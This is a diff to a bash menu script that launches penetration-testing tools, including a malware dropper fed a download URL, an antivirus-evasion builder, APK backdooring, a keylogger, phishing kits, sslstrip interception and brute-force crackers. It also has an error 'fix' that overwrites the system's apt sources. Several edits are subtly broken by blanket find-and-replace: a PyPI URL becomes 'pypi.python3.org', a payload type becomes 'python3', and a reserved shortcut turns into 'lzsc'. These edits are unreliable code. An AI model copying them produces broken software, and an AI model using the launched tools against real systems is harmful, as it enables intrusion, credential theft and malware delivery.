@@ -12,7 +12,10 @@ cd
 function defaults_l
 {
 #path for lscript
-	LPATH="/root/lscript"
+	# Always resolve LPATH to wherever this script actually lives
+	LPATH="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
+	# If installed to /root/lscript use that, otherwise use script dir
+	[[ -d "/root/lscript" && -f "/root/lscript/lh1" ]] && LPATH="/root/lscript"
 	export LPATH
 #path for keyboard shortcuts
 	KSPATH=""$LPATH"/ks"
@@ -386,7 +389,7 @@ then
 	exit
 elif [[ "$MYINT" = "00" || "$MYINT" = "b" ]]
 then
-	exec bash "$0"
+	exec bash "$LPATH/l"
 elif [[ "$MYINT" = "3" ]]
 then
 	MYINT="$ETH"
@@ -396,7 +399,7 @@ sleep 2
 clear
 echo -e "EXITING"
 sleep 1
-exec bash "$0"
+exec bash "$LPATH/l"
 fi
 export MYINT
 }
@@ -433,39 +436,40 @@ function change_mac
 function set_interface_number
 {
 clear
-while true
-do
-echo -e "Enter the name of your wireless interface when in "$RS"managed"$CE" mode("$YS"Enter"$CE"=wlan0): "
-read MANAGED
-if [[ "$MANAGED" = "" ]]
-then
-	MANAGED="wlan0"
+# Detect available wireless interfaces
+mapfile -t _IFACES < <(iw dev 2>/dev/null | awk '/Interface/{print $2}')
+if [[ ${#_IFACES[@]} -eq 0 ]]; then
+    for d in /sys/class/net/*/wireless; do
+        [[ -d "$d" ]] && _IFACES+=("$(basename "$(dirname "$d")")")
+    done
 fi
-echo -e "Enter the name of your wireless interface when in "$RS"monitor"$CE" mode("$YS"Enter"$CE"=wlan0mon): "
-read MONITOR
-if [[ "$MONITOR" = "" ]]
-then
-	MONITOR="wlan0mon"
+
+echo -e "${YS}Wireless interface setup${CE}"
+echo -e "Detected interfaces:"
+if [[ ${#_IFACES[@]} -eq 0 ]]; then
+    echo -e "  ${RS}None detected${CE}"
+else
+    for _if in "${_IFACES[@]}"; do
+        echo -e "  ${YS}*${CE} ${_if}"
+    done
 fi
-echo -e "Enter the name of your wired interface("$YS"Enter"$CE"="eth0"): "
-read WIRED
-if [[ "$WIRED" = "" ]]
-then
-	WIRED="eth0"
-fi
-	echo "$MANAGED" > "$LPATH"/wlan.txt
-	echo "$MONITOR" > "$LPATH"/wlanmon.txt
-	echo "$WIRED" > "$LPATH"/eth.txt
-	echo -e ""$YS"Done"$CE""
-	sleep 1
-	clear
-	echo -e ""$BS"If you want to change it, type "$CE""$YS"interface"$CE""$BS" any time"$CE""
-	sleep 3
-	echo -e "$PAKTC"
-	$READAK	
-	BACKL="1"
-	break
-done
+echo
+echo -e "Enter your ${YS}managed${CE} interface name (e.g. wlan0, wlan1):"
+read -e WLANN
+[[ -z "$WLANN" && ${#_IFACES[@]} -gt 0 ]] && WLANN="${_IFACES[0]}"
+[[ -z "$WLANN" ]] && WLANN="wlan0"
+
+echo -e "Enter your ${YS}monitor${CE} interface name (Enter = ${WLANN}mon):"
+read -e WLANNM
+[[ -z "$WLANNM" ]] && WLANNM="${WLANN}mon"
+
+export WLANN WLANNM
+echo "${WLANN}" > /root/lscript/wlan.txt
+echo "${WLANNM}" > /root/lscript/wlanmon.txt
+echo -e "${YS}Done. Managed: ${WLANN} / Monitor: ${WLANNM}${CE}"
+sleep 2
+clear
+BACKL="1"
 }
 function checkifalready
 {
@@ -483,7 +487,7 @@ function checkifalready
 	done
 	if [[ "$GOOD" = "1" ]]
 	then
-		if [[ "$CHECKKS" = "etercheck" || "$CHECKKS" = "eternalblue" || "$CHECKKS" = "changelog" || "$CHECKKS" = "wififb" || "$CHECKKS" = "nessusstop" || "$CHECKKS" = "nessusstart" || "$CHECKKS" = "pstop" || "$CHECKKS" = "pstart" || "$CHECKKS" = "astop" || "$CHECKKS" = "astart" || "$CHECKKS" = "settings" || "$CHECKKS" = "donate" || "$CHECKKS" = "d" || "$CHECKKS" = "s" || "$CHECKKS" = "g" || "$CHECKKS" = "l" || "$CHECKKS" = "" || "$CHECKKS" = "if" || "$CHECKKS" = "ifconfig" || "$CHECKKS" = "interfaces" || "$CHECKKS" = "interface" || "$CHECKKS" = "errors" || "$CHECKKS" = "00" || "$CHECKKS" = "exit" || "$CHECKKS" = "update" || "$CHECKKS" = "d1" || "$CHECKKS" = "d2" || "$CHECKKS" = "d3" || "$CHECKKS" = "d4" || "$CHECKKS" = "d5" || "$CHECKKS" = "d6" || "$CHECKKS" = "d7" || "$CHECKKS" = "gg" || "$CHECKKS" = "ks" ]]
+		if [[ "$CHECKKS" = "etercheck" || "$CHECKKS" = "eternalblue" || "$CHECKKS" = "changelog" || "$CHECKKS" = "wififb" || "$CHECKKS" = "nessusstop" || "$CHECKKS" = "nessusstart" || "$CHECKKS" = "pstop" || "$CHECKKS" = "pstart" || "$CHECKKS" = "astop" || "$CHECKKS" = "astart" || "$CHECKKS" = "settings" || "$CHECKKS" = "donate" || "$CHECKKS" = "d" || "$CHECKKS" = "s" || "$CHECKKS" = "g" || "$CHECKKS" = "lzsc" || "$CHECKKS" = "" || "$CHECKKS" = "if" || "$CHECKKS" = "ifconfig" || "$CHECKKS" = "interfaces" || "$CHECKKS" = "interface" || "$CHECKKS" = "errors" || "$CHECKKS" = "00" || "$CHECKKS" = "exit" || "$CHECKKS" = "update" || "$CHECKKS" = "d1" || "$CHECKKS" = "d2" || "$CHECKKS" = "d3" || "$CHECKKS" = "d4" || "$CHECKKS" = "d5" || "$CHECKKS" = "d6" || "$CHECKKS" = "d7" || "$CHECKKS" = "gg" || "$CHECKKS" = "ks" ]]
 		then
 			GOOD="0"
 			echo -e ""$RS"This shortcut is already in use by the script."$CE""
@@ -627,7 +631,7 @@ function listshortcuts
 	then
 		TITLE="Cupp"
 		NAMECD="cd /root/cupp"
-		KSSET="python cupp.py -i"
+		KSSET="python3 cupp.py -i"
 	elif [[ "$nn" = "10" ]]
 	then
 		TITLE="Dracnmap"
@@ -642,7 +646,7 @@ function listshortcuts
 	then
 		TITLE="KickThemOut"
 		NAMECD="cd /root/kickthemout"
-		KSSET="python kickthemout.py"
+		KSSET="python3 kickthemout.py"
 	elif [[ "$nn" = "13" ]]
 	then
 		TITLE="Ghost-Phisher"
@@ -672,7 +676,7 @@ function listshortcuts
 	then
 		TITLE="BeeLogger"
 		NAMECD="cd /root/BeeLogger"
-		KSSET="python bee.py"
+		KSSET="python3 bee.py"
 	elif [[ "$nn" = "19" ]]
 	then
 		TITLE="Ezsploit"
@@ -702,7 +706,7 @@ function listshortcuts
 	then
 		TITLE="ReconDog"
 		NAMECD="cd /root/ReconDog"
-		KSSET="python dog.py"
+		KSSET="python3 dog.py"
 	elif [[ "$nn" = "24" ]]
 	then
 		TITLE="RED_HAWK"
@@ -727,7 +731,7 @@ function listshortcuts
 	then
 		TITLE="nWatch"
 		NAMECD="cd /root/nWatch"
-		KSSET="python nwatch.py"
+		KSSET="python3 nwatch.py"
 	elif [[ "$nn" = "29" ]]
 	then
 		TITLE="Eternal_scanner"
@@ -752,7 +756,7 @@ function listshortcuts
 	then
 		TITLE="Operative-framework"
 		NAMECD="cd /root/operative-framework"
-		KSSET="python operative.py"
+		KSSET="python3 operative.py"
 	elif [[ "$nn" = "34" ]]
 	then
 		TITLE="Koadic"
@@ -782,12 +786,12 @@ function listshortcuts
 	then
 		TITLE="Leviathan"
 		NAMECD="cd /root/leviathan"
-		KSSET="python leviathan.py"
+		KSSET="python3 leviathan.py"
 	elif [[ "$nn" = "40" ]]
 	then
 		TITLE="Gloom-Framework"
 		NAMECD="cd /root/Gloom-Framework"
-		KSSET="python gloom.py"
+		KSSET="python3 gloom.py"
 	elif [[ "$nn" = "41" ]]
 	then
 		TITLE="Arcanus"
@@ -797,12 +801,12 @@ function listshortcuts
 	then
 		TITLE="LFISuite"
 		NAMECD="cd /root/LFISuite"
-		KSSET="python lfisuite.py"
+		KSSET="python3 lfisuite.py"
 	elif [[ "$nn" = "43" ]]
 	then
 		TITLE="DKMC"
 		NAMECD="cd /root/DKMC"
-		KSSET="python dkmc.py"
+		KSSET="python3 dkmc.py"
 	elif [[ "$nn" = "44" ]]
 	then
 		TITLE="SecHub"
@@ -822,32 +826,32 @@ function listshortcuts
 	then
 		TITLE="NoSQLMap"
 		NAMECD="cd /root/NoSQLMap"
-		KSSET="python nosqlmap.py"
+		KSSET="python3 nosqlmap.py"
 	elif [[ "$nn" = "48" ]]
 	then
 		TITLE="EggShell"
 		NAMECD="cd /root/EggShell"
-		KSSET="python eggshell.py"
+		KSSET="python3 eggshell.py"
 	elif [[ "$nn" = "49" ]]
 	then
 		TITLE="Zerodoor"
 		NAMECD="cd /root/Zerodoor"
-		KSSET="python zerodoor.py"
+		KSSET="python3 zerodoor.py"
 	elif [[ "$nn" = "50" ]]
 	then
 		TITLE="AutoSploit"
 		NAMECD="cd /root/AutoSploit"
-		KSSET="python autosploit.py"
+		KSSET="python3 autosploit.py"
 	elif [[ "$nn" = "51" ]]
 	then
 		TITLE="Enigma"
 		NAMECD="cd /root/Enigma"
-		KSSET="python enigma.py"
+		KSSET="python3 enigma.py"
 	elif [[ "$nn" = "52" ]]
 	then
 		TITLE="SocialFish"
 		NAMECD="cd /root/SocialFish"
-		KSSET="python SocialFish.py"
+		KSSET="python3 SocialFish.py"
 	elif [[ "$nn" = "53" ]]
 	then
 		TITLE="Yuki-Chan-The-Auto-Pentest"
@@ -1278,7 +1282,7 @@ done
 		#~ break
 	#~ elif [[ "$REIN" = "00" ]]
 	#~ then	
-		#~ exec bash "$0"
+		#~ exec bash "$LPATH/l"
 	#~ elif [[ "$REIN" = "0" ]]
 	#~ then
 		#~ clear
@@ -1299,7 +1303,7 @@ echo -e ""$YS" 2"$CE") No output in wash"
 echo -e ""$YS" 3"$CE") No full screen"
 echo -e ""$YS" 4"$CE") Error constructing proxy for org.gnome.Terminal"
 echo -e ""$YS" 5"$CE") Error starting apache2 service"
-echo -e ""$YS" 6"$CE") Errors when apt-get update"
+echo -e ""$YS" 6"$CE") Errors when apt update"
 echo -e ""$YS" 7"$CE") Errors when creating a payload with Winpayloads"
 echo -e ""$YS" 8"$CE") Complete fix for apache2 service failed to start"
 echo -e ""$YS" 9"$CE") Cannot capture handshake-pyrit verification always bad"
@@ -1319,7 +1323,7 @@ then
 	clear
 	echo -e "Installing pulseaudio......."
 	sleep 1
-	apt-get pulseaudio
+	apt pulseaudio
 	echo -e "Enabling pulseaudio......."
 	sleep 1
 	systemctl --user enable pulseaudio && systemctl --user start pulseaudio
@@ -1348,7 +1352,7 @@ then
 	wash -i $INTWASH
 elif [[ "$ERRS" = "3" ]]
 then
-	apt-get install -y open-vm-tools-desktop fuse
+	apt install -y open-vm-tools-desktop fuse
 	echo -e "Restart your vistual machine..."
 	sleep 2
 	echo -e "$PAKTGB"
@@ -1369,7 +1373,7 @@ elif [[ "$ERRS" = "6" ]]
 then
 	echo "deb http://http.kali.org/kali kali-rolling main non-free contrib" > /etc/apt/sources.list
 	rm -r -f /etc/apt/sources.list.d/*
-	echo -e "Try   apt-get update    again. That's all i can do."
+	echo -e "Try   apt update    again. That's all i can do."
 	sleep 3
 elif [[ "$ERRS" = "7" ]]
 then
@@ -1379,17 +1383,17 @@ then
 	$READAK
 elif [[ "$ERRS" = "8" ]]
 then
-	apt-get -y remove nginx
-	apt-get -y remove nginx-full
-	apt-get -y remove nginx-common
-	apt-get -y autoremove
+	apt -y remove nginx
+	apt -y remove nginx-full
+	apt -y remove nginx-common
+	apt -y autoremove
 	clear
 	echo -e "Error was fixed!"
 	echo -e "$PAKTGB"
 	$READAK
 elif [[ "$ERRS" = "9" ]]
 then
-	wget -O /tmp/scapy2.3.2.tar.gz https://pypi.python.org/packages/6d/72/c055abd32bcd4ee6b36ef8e9ceccc2e242dea9b6c58fdcf2e8fd005f7650/scapy-2.3.2.tar.gz; sudo pip2 install /tmp/scapy2.3.2.tar.gz
+	wget -O /tmp/scapy2.3.2.tar.gz https://pypi.python3.org/packages/6d/72/c055abd32bcd4ee6b36ef8e9ceccc2e242dea9b6c58fdcf2e8fd005f7650/scapy-2.3.2.tar.gz; sudo pip2 install /tmp/scapy2.3.2.tar.gz
 	clear
 	echo -e "Error was fixed!"
 	echo -e "$PAKTGB"
@@ -1491,7 +1495,7 @@ then
 			exit
 		elif [[ "$nn" = "00" ]]
 		then
-			exec bash "$0"
+			exec bash "$LPATH/l"
 		elif [[ "$nn" = "reset" ]]
 		then
 			rm -r "$KSPATH"/*
@@ -1514,7 +1518,7 @@ then
 		exit
 	elif [[ "$KS" = "00" ]]
 	then
-		exec bash "$0"
+		exec bash "$LPATH/l"
 	fi
 done
 }
@@ -1615,9 +1619,9 @@ then
 		export PORTTCP
 		export PORTUDP
 		cd "$LPATH"/ls
-		gnome-terminal --geometry 60x12+0+999999 -e ./l131.sh
-		gnome-terminal --geometry 60x20+999999+999999 -e ./l133.sh
-		gnome-terminal --geometry 60x20+999999+0 -e ./l132.sh
+		gnome-terminal -- /root/lscript/ls/l131.sh
+		gnome-terminal -- /root/lscript/ls/l133.sh
+		gnome-terminal -- /root/lscript/ls/l132.sh
 		sslstrip -l $PORTTCP -w /root/sslstrip.log
 		echo -e "$PAKTGB"
 		$READAK
@@ -1646,16 +1650,16 @@ then
 		export PORTTCP
 		export PORTUDP
 		cd "$LPATH"/ls
-		gnome-terminal --geometry 60x25+0+999999 -e ./l131.sh
-		gnome-terminal --geometry 60x25+999999+0 -e ./l132.sh
-		gnome-terminal --geometry 60x25+999999+999999 -e ./l133.sh
+		gnome-terminal -- /root/lscript/ls/l131.sh
+		gnome-terminal -- /root/lscript/ls/l132.sh
+		gnome-terminal -- /root/lscript/ls/l133.sh
 		sslstrip -l $PORTTCP -w /root/sslstrip.log
 		echo -e "$PAKTGB"
 		$READAK
 		continue
 	elif [[ "$MITMCH" = "4" ]]
 	then
-		leafpad /root/sslstrip.log
+		mousepad /root/sslstrip.log
 	#~ elif [[ "$MITMCH" = "44" ]]
 	#~ then
 	elif [[ "$MITMCH" = "back" || "$MITMCH" = "b" ]]
@@ -1665,7 +1669,7 @@ then
 	elif [[ "$MITMCH" = "00" ]]
 	then
 		clear
-		exec bash "$0"
+		exec bash "$LPATH/l"
 	elif [[ "$MITMCH" = "0" ]]
 	then
 		clear
@@ -1741,8 +1745,8 @@ then
 		export TARGIP
 		export GATENM
 		cd "$LPATH"/ls
-		gnome-terminal --geometry 60x15+999999+0 -e ./l132.sh
-		gnome-terminal --geometry 60x15+999999+999999 -e ./l133.sh
+		gnome-terminal -- /root/lscript/ls/l132.sh
+		gnome-terminal -- /root/lscript/ls/l133.sh
 	#~ elif [[ "$MITMSET" = "4" ]]
 	#~ then
 		#~ service apache2 start
@@ -1755,7 +1759,7 @@ then
 		ip addr | grep '/24' | awk -F "inet " {'print $2'} | cut -d '/' -f1
 		echo -e "$PAKTC"
 		$READAK
-		gnome-terminal --geometry 66x40+999999+0 -e setoolkit
+		gnome-terminal -- setoolkit
 	elif [[ "$MITMSET" = "5" ]]
 	then
 		echo -e "Making you a hosts.txt file"
@@ -1800,7 +1804,7 @@ then
 	elif [[ "$MITMSET" = "00" ]]
 	then
 		clear
-		exec bash "$0"
+		exec bash "$LPATH/l"
 	elif [[ "$MITMSET" = "0" ]]
 	then
 		clear
@@ -1814,7 +1818,7 @@ then
 elif [[ "$MITMATT" = "00" ]]
 then			
 	clear
-	exec bash "$0"
+	exec bash "$LPATH/l"
 elif [[ "$MITMATT" = "0" ]]
 then
 	clear
@@ -1897,7 +1901,7 @@ do
 	elif [[ "$DAGON" = "update" ]]
 	then
 		cd /root/dagon
-		python dagon.py --update
+		python3 dagon.py --update
 		sleep 3
 	elif [[ "$DAGON" = "start" ]]
 	then
@@ -1917,17 +1921,17 @@ do
 		then
 			if [[ "$CORV" = "crack" ]]
 			then
-				HASHCOMMAND="python dagon.py -c "$HASH" --bruteforce"
+				HASHCOMMAND="python3 dagon.py -c "$HASH" --bruteforce"
 			else
-				HASHCOMMAND="python dagon.py -v "$HASH""
+				HASHCOMMAND="python3 dagon.py -v "$HASH""
 			fi
 		elif [[ "$HASHTYPE" = 2 || "$HASHTYPE" = 3 ]]
 		then
 			if [[ "$CORV" = "crack" ]]
 			then
-				HASHCOMMAND="python dagon.py -l "$HASH" --bruteforce"
+				HASHCOMMAND="python3 dagon.py -l "$HASH" --bruteforce"
 			else
-				HASHCOMMAND="python dagon.py -V "$HASH""
+				HASHCOMMAND="python3 dagon.py -V "$HASH""
 			fi
 		fi
 		if [[ "$DICTATTACK" = "ON" ]]
@@ -2241,7 +2245,7 @@ EOF
 	else
 		cd /root/patator
 		export XTP
-		xterm -T "INSTRUCTIONS" -hold -e "echo -e "---------------------------------------" && echo -e 'start with: python patator.py $XPT' && echo -e "---------------------------------------" && python patator.py $XPT" & disown
+		xterm -T "INSTRUCTIONS" -hold -e "echo -e "---------------------------------------" && echo -e 'start with: python3 patator.py $XPT' && echo -e "---------------------------------------" && python3 patator.py $XPT" & disown
 		xterm -T "PATATOR" -hold & disown
 	fi
 done
@@ -2689,7 +2693,7 @@ do
 	if [[ "$DR" = "u" ]]
 	then
 		cd /root/Dr0p1t-Framework
-		python Dr0p1t.py -u
+		python3 Dr0p1t.py -u
 		cd
 		continue
 	fi
@@ -2810,7 +2814,7 @@ do
 			DBANN="-q"
 		fi
 		cd /root/Dr0p1t-Framework
-		python Dr0p1t.py $MALURL $DSTARTUP $DTASK $DLTPUP $DKILLANT $DRUNBAT $DRUNPOW $DRUNVBS $DUACASADMIN $DSPOOFEXT $DISZIP $DCOMPRESS $DDISUAC $DICON $DEVENT $DCOMPILE $DD32 $DD64 $DBANN
+		python3 Dr0p1t.py $MALURL $DSTARTUP $DTASK $DLTPUP $DKILLANT $DRUNBAT $DRUNPOW $DRUNVBS $DUACASADMIN $DSPOOFEXT $DISZIP $DCOMPRESS $DDISUAC $DICON $DEVENT $DCOMPILE $DD32 $DD64 $DBANN
 		echo -e "$PAKTGB"
 		$READAK
 		cd
@@ -3388,7 +3392,7 @@ function wifi_tools
 			else
 				echo -e "You have to install it manually since its not on github.Sorry."
 				sleep 4
-				exec bash "$0"
+				exec bash "$LPATH/l"
 			fi
 		else
 			echo -e "$TNI"
@@ -3493,7 +3497,7 @@ function wifi_tools
 		if [[ -d "/usr/share/fern-wifi-cracker" ]]
 		then
 			cd /root/Fern-Wifi-Cracker
-			python execute.py
+			python3 execute.py
 			cd
 		else
 			echo -e "$TNI"
@@ -3531,7 +3535,7 @@ function wifi_tools
 		if [[ -d "/root/kickthemout" ]]
 		then
 			cd /root/kickthemout
-			python kickthemout.py
+			python3 kickthemout.py
 			cd
 		else
 			echo -e "$TNI"
@@ -3548,7 +3552,7 @@ function wifi_tools
 		if [[ -d "/usr/share/ghost-phisher" ]]
 		then	
 			cd /root/ghost-phisher/Ghost-Phisher
-			python ghost.py
+			python3 ghost.py
 			cd
 		else
 			echo -e "$TNI"
@@ -3604,7 +3608,7 @@ function wifi_tools
 				clear
 				echo -e "Then never try this."
 				sleep 3
-				exec bash "$0"
+				exec bash "$LPATH/l"
 			fi
 		else
 			echo -e "$TNI"
@@ -3672,12 +3676,12 @@ function wifi_tools
 			if [[ "$SORS" == "start" ]]
 			then
 				netstat -nltp
-				openvas-start
+				gvm-start
 				echo -e "Launching firefox..."
 				sleep 1
 				firefox https://127.0.0.1:9392
 			else
-				openvas-stop
+				gvm-stop
 			fi
 		else
 			echo -e "$TNI"
@@ -3726,7 +3730,7 @@ function wifi_tools
 		if [[ -d "/root/nWatch" ]]
 		then
 			cd /root/nWatch
-			python nwatch.py
+			python3 nwatch.py
 			cd
 		else
 			echo -e "$TNI"
@@ -3826,7 +3830,7 @@ function wifi_tools
 		if [[ -d "/root/Gloom-Framework" ]]
 		then
 			cd /root/Gloom-Framework
-			python gloom.py
+			python3 gloom.py
 		else
 			echo -e "$TNI"
 			read INSTALL
@@ -3859,7 +3863,7 @@ function wifi_tools
 		if [[ -d "/root/SocialFish" ]]
 		then
 			cd /root/SocialFish
-			python SocialFish.py
+			python3 SocialFish.py
 		else
 			echo -e "$TNI"
 			read INSTALL
@@ -3922,7 +3926,7 @@ function wifi_tools
 					exit
 				elif [[ "$OSFR" = "00" ]]
 				then
-					exec bash "$0"
+					exec bash "$LPATH/l"
 				elif [[ "$OSFR" = "back" || "$OSFR" = "b" ]]
 				then
 					break
@@ -3930,7 +3934,7 @@ function wifi_tools
 					echo -e "Wrong choice"
 					sleep 0.3
 					clear
-					exec bash "$0"
+					exec bash "$LPATH/l"
 				fi
 			done
 		else
@@ -3950,7 +3954,7 @@ function wifi_tools
 	elif [[ "$APPP" = "00" ]]
 	then
 		clear
-		exec bash "$0"
+		exec bash "$LPATH/l"
 	elif [[ "$APPP" = "back" || "$APPP" = "b" ]]
 	then
 		break
@@ -4167,7 +4171,7 @@ function remote_access
 		if [[ -d /root/BeeLogger ]]
 		then
 			cd /root/BeeLogger
-			python bee.py
+			python3 bee.py
 			cd
 		else
 			echo -e "$TNI"
@@ -4264,7 +4268,7 @@ function remote_access
 		if [[ -d /root/leviathan ]]
 		then
 			cd /root/leviathan
-			python leviathan.py
+			python3 leviathan.py
 		else
 			echo -e "$TNI"
 			read INSTALL
@@ -4328,7 +4332,7 @@ function remote_access
 		if [[ -d /root/ARCANUS ]]
 		then
 			cd /root/ARCANUS
-			gnome-terminal -e "./ARCANUS & disown"
+			gnome-terminal -- "./ARCANUS & disown"
 		else	
 			echo -e "$TNI"
 			read INSTALL
@@ -4397,7 +4401,7 @@ function remote_access
 						MTYPE="powershell"
 					elif [[ "$TYPE" = 11 ]]
 					then
-						MTYPE="python"		
+						MTYPE="python3"		
 					elif [[ "$TYPE" = 12 ]]
 					then
 						MTYPE="tomcat"
@@ -4578,7 +4582,7 @@ function remote_access
 			done
 				clear
 				cd /root/morphHTA
-				python morph-hta.py --in "$FPATH" --out "$M5" --mode "$M1" --maxstrlen "$M2" --maxvarlen "$M3" --maxnumsplit "$M4"
+				python3 morph-hta.py --in "$FPATH" --out "$M5" --mode "$M1" --maxstrlen "$M2" --maxvarlen "$M3" --maxnumsplit "$M4"
 				cd
 		else	
 			echo -e "$TNI"
@@ -4595,7 +4599,7 @@ function remote_access
 		if [[ -d /root/LFISuite ]]
 		then
 			cd /root/LFISuite
-			python lfisuite.py
+			python3 lfisuite.py
 		else	
 			echo -e "$TNI"
 			read INSTALL
@@ -4656,7 +4660,7 @@ function remote_access
 							FC="process-evasion.json"
 						fi
 						cd /root/UniByAv
-						python UniByAv*.py "$RPATH" "$OUT" none /root/UniByAv/configs/"$FC"
+						python3 UniByAv*.py "$RPATH" "$OUT" none /root/UniByAv/configs/"$FC"
 						break
 				else
 					#~ GCC=$(which gcc)
@@ -4683,7 +4687,7 @@ function remote_access
 							#~ FC="process-evasion.json"
 						#~ fi
 						#~ cd /root/UniByAv
-						#~ python UniByAv*.py "$RPATH" "$OUT" none /root/UniByAv/configs/"$FC"
+						#~ python3 UniByAv*.py "$RPATH" "$OUT" none /root/UniByAv/configs/"$FC"
 						#~ break
 					#~ else
 						echo -e "Path to mingw32-gcc.exe : "
@@ -4709,13 +4713,13 @@ function remote_access
 							FC="process-evasion.json"
 						fi
 						cd /root/UniByAv
-						python UniByAv*.py "$RPATH" "$OUT" "$PGCC" /root/UniByAv/configs/"$FC"
+						python3 UniByAv*.py "$RPATH" "$OUT" "$PGCC" /root/UniByAv/configs/"$FC"
 						break
 					#~ fi
 				fi	
 			done
 			cd /root/UniByAv
-			python UniByAv*.py
+			python3 UniByAv*.py
 		else	
 			echo -e "$TNI"
 			read INSTALL
@@ -4771,7 +4775,7 @@ function remote_access
 					echo -e "Output file name: "
 					read FN
 					cd /root/demiguise
-					python demiguise.py -k "$ENC" -p "$PTT" "$CCHTA" -o "$FN"
+					python3 demiguise.py -k "$ENC" -p "$PTT" "$CCHTA" -o "$FN"
 					if [[ -f /root/demiguise/$FN ]]
 					then
 						echo -e "Output file: /root/demiguise/"$FN""
@@ -4803,7 +4807,7 @@ function remote_access
 		if [[ -d /root/DKMC ]]
 		then
 			cd /root/DKMC
-			python dkmc.py
+			python3 dkmc.py
 		else	
 			echo -e "$TNI"
 			read INSTALL
@@ -4851,7 +4855,7 @@ function remote_access
 		if [[ -d /root/EggShell ]]
 		then
 			cd /root/EggShell
-			python eggshell.py
+			python3 eggshell.py
 		else	
 			echo -e "$TNI"
 			read INSTALL
@@ -4867,7 +4871,7 @@ function remote_access
 		if [[ -d /root/Zerodoor ]]
 		then
 			cd /root/Zerodoor
-			python zerodoor.py
+			python3 zerodoor.py
 		else	
 			echo -e "$TNI"
 			read INSTALL
@@ -4899,7 +4903,7 @@ function remote_access
 		if [[ -d /root/AutoSploit ]]
 		then
 			cd /root/AutoSploit
-			python autosploit.py
+			python3 autosploit.py
 		else	
 			echo -e "$TNI"
 			read INSTALL
@@ -4915,7 +4919,7 @@ function remote_access
 		if [[ -d /root/Enigma ]]
 		then
 			cd /root/Enigma
-			python enigma.py
+			python3 enigma.py
 		else	
 			echo -e "$TNI"
 			read INSTALL
@@ -5040,7 +5044,7 @@ function remote_access
 						continue
 					fi
 					cd /root/kwetza
-					python kwetza.py $APK $APKLH $APKPROT $APKLP $APKPERM
+					python3 kwetza.py $APK $APKLH $APKPROT $APKLP $APKPERM
 					echo -e "$PAKTGB"
 					$READAK
 				fi
@@ -5081,7 +5085,7 @@ function remote_access
 			sleep 2
 			echo -e "Press "$YS"any key"$CE" to leave..."
 			$READAK
-			exec bash "$0"
+			exec bash "$LPATH/l"
 		else
 			echo -e "$TNI"
 			read INSTALL
@@ -5126,7 +5130,7 @@ function remote_access
 				else
 					echo -e "Wrong choice.Returning to main manu..."
 					sleep 2
-					exec bash "$0"
+					exec bash "$LPATH/l"
 				fi
 				clear
 				echo -e "Enter your ip: "
@@ -5146,7 +5150,7 @@ function remote_access
 				./pupysh.py
 			elif [[ "$PUPY" = "00" ]]
 			then
-				exec bash "$0"
+				exec bash "$LPATH/l"
 			elif [[ "$PUPY" = "back" || "$PUPY" = "b" ]]
 			then
 				break
@@ -5226,7 +5230,7 @@ function remote_access
 	elif [[ "$KEYLOG" = "00" ]]
 	then
 		clear
-		exec bash "$0"
+		exec bash "$LPATH/l"
 	elif [[ "$KEYLOG" = "0" ]]
 	then
 		clear
@@ -5317,7 +5321,7 @@ function information_gathering
 			if [[ -d /root/ReconDog ]]
 			then
 				cd /root/ReconDog
-				python dog.py
+				python3 dog.py
 				cd
 			else
 				echo -e "$TNI"
@@ -5357,7 +5361,7 @@ function information_gathering
 				read INFOSOUR
 				clear
 				cd /root/Infoga
-				python infoga.py -t $INFOTARG -s $INFOSOUR 
+				python3 infoga.py -t $INFOTARG -s $INFOSOUR 
 				echo -e "$PAKTGB"
 				$READAK
 				cd
@@ -5461,7 +5465,7 @@ function information_gathering
 						exit
 					elif [[ "$OSFR" = "00" ]]
 					then
-						exec bash "$0"
+						exec bash "$LPATH/l"
 					elif [[ "$OSFR" = "back" || "$OSFR" = "b" ]]
 					then
 						break
@@ -5469,7 +5473,7 @@ function information_gathering
 						echo -e "Wrong choice"
 						sleep 0.3
 						clear
-						exec bash "$0"
+						exec bash "$LPATH/l"
 					fi
 				done
 			else
@@ -5595,7 +5599,7 @@ function website_tools
 			if [[ -d /root/leviathan ]]
 			then
 				cd /root/leviathan
-				python leviathan.py
+				python3 leviathan.py
 			else
 				echo -e "$TNI"
 				read INSTALL
@@ -5611,7 +5615,7 @@ function website_tools
 			if [[ -d /root/NoSQLMap ]]
 			then
 				cd /root/NoSQLMap
-				python nosqlmap.py
+				python3 nosqlmap.py
 			else
 				echo -e "$TNI"
 				read INSTALL
@@ -5645,7 +5649,7 @@ function website_tools
 			if [[ -d /root/Blazy ]]
 			then
 				cd /root/Blazy
-				python blazy.py
+				python3 blazy.py
 				echo -e "$PAKTGB"
 				$READAK
 			else
@@ -5663,7 +5667,7 @@ function website_tools
 			if [[ -d /root/Striker ]]
 			then
 				cd /root/Striker
-				python striker.py
+				python3 striker.py
 				echo -e "$PAKTGB"
 				$READAK
 			else
@@ -5681,7 +5685,7 @@ function website_tools
 			if [[ -d /root/hyprPulse ]]
 			then
 				cd /root/hyprPulse
-				python pulsar.py
+				python3 pulsar.py
 				echo -e "$PAKTGB"
 				$READAK
 			else
@@ -5699,7 +5703,7 @@ function website_tools
 			if [[ -d /root/InstaBurst ]]
 			then
 				cd /root/InstaBurst
-				python instagram.py
+				python3 instagram.py
 				echo -e "$PAKTGB"
 				$READAK
 			else
@@ -5801,7 +5805,7 @@ function website_tools
 				echo -e ""$YS"Domain: "$CE""
 				read DMN
 				cd /root/datasploit
-				python datasploit.py -i "$DMN"
+				python3 datasploit.py -i "$DMN"
 				echo -e "$PAKTGB"
 				$READAK
 			else
@@ -5819,7 +5823,7 @@ function website_tools
 			if [[ -d /root/SiteBroker ]]
 			then
 				cd /root/SiteBroker
-				python SiteBroker.py
+				python3 SiteBroker.py
 				echo -e "$PAKTGB"
 				$READAK
 			else
@@ -5959,7 +5963,7 @@ do
 		if [[ -d "/root/cupp" ]]
 		then
 			cd /root/cupp
-			python cupp.py -i
+			python3 cupp.py -i
 			cd		
 			echo -e "$PAKTGB"
 			$READAK	
@@ -5993,7 +5997,7 @@ do
 		if [[ -d "/root/Hash-Buster" ]]
 		then
 			cd /root/Hash-Buster
-			python hash.py	
+			python3 hash.py	
 			echo -e "$PAKTGB"
 			$READAK	
 		else
@@ -6244,7 +6248,7 @@ function metasploit_menu
 		msfconsole
 	elif [[ "$METASP" = "5" ]]
 	then
-		msfupdate
+		apt install -y metasploit-framework
 	elif [[ "$METASP" = "6" ]]
 	then
 		service postgresql start
@@ -6259,7 +6263,7 @@ function metasploit_menu
 		break
 	elif [[ "$METASP" = "00" ]]
 	then
